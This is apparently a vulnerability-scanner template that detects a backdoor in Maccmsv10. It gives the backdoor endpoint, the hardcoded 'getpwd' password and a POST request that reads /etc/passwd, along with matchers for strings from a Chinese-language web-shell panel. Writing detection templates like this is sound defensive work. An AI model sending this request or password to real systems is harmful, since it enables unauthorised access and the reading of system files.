id: maccmsv10-backdoor
name: Maccmsv10 - Backdoor Remote Code Execution
severity: critical
confidence: tentative
description: Maccmsv10 contains a backdoor which can be exploited by remote attackers. The backdoor is accessible via the
  '/index.php/bbs/index/download' endpoint and the special 'getpwd' parameter value of 'WorldFilledWithLove'. Exploitation
  of this vulnerability will allow remote attackers to execute code.
reference: CWE-77
tags:
- maccmsv10
- rce
- backdoor
- vuln
requests:
- method: POST
  path: /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
  matchers:
  - type: body
    words:
    - 扫描后门
    - 反弹端口
    - 文件管理
  - type: status
    status:
    - 200
  condition: and
  headers:
    Content-Type: application/x-www-form-urlencoded
  body: getpwd=WorldFilledWithLove
